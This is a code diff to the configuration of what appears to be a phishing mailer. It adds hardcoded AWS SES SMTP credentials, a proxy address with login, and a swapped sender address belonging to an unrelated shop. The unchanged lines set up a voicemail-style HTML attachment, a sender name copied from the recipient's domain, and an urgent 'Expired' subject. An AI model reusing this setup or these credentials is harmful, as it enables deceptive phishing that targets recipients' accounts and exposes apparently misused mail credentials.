@@ -102,12 +102,12 @@ const options = {
   useAuthentication: false,
   useProxy: false,
   proxyType: 'SOCKS5', // Options: 'SOCKS', 'HTTPS'
-  smtpHost: 'efasglobal-com.mail.protection.outlook.com',
+  smtpHost: 'email-smtp.ap-northeast-2.amazonaws.com',
   smtpPort: 25,
   smtpSecure: false,
   secureProtocol: 'SSLv23_method', // Options: 'SSLv23_method', 'TLSv1_2_method', etc.
-  smtpUsername: '',
-  smtpPassword: '',
+  smtpUsername: 'AKIAXPBFFDE3NDZIVZZV',
+  smtpPassword: 'BJ2PCaF0DeuPI04jFLucK/uQpCUg41FM9EivlwGMWQb5',
   proxyHost: '63.160.189.222',
   proxyPort: 35149,
   proxyUsername: 'user',
@@ -122,7 +122,7 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'vm-20241104193406035753-fadceb388a85af9bdf506d7fgds693hdj.html';
-const senderAddresses = ['john@efasglobal.com'];
+const senderAddresses = ['risekoreabooks@risemall.co.kr'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = "{RECIPIENT_DOMAIN_NAME}"; 
 const subjectLineWithPlaceholders = "⏰ {RECIPIENT_NAME} Expired";
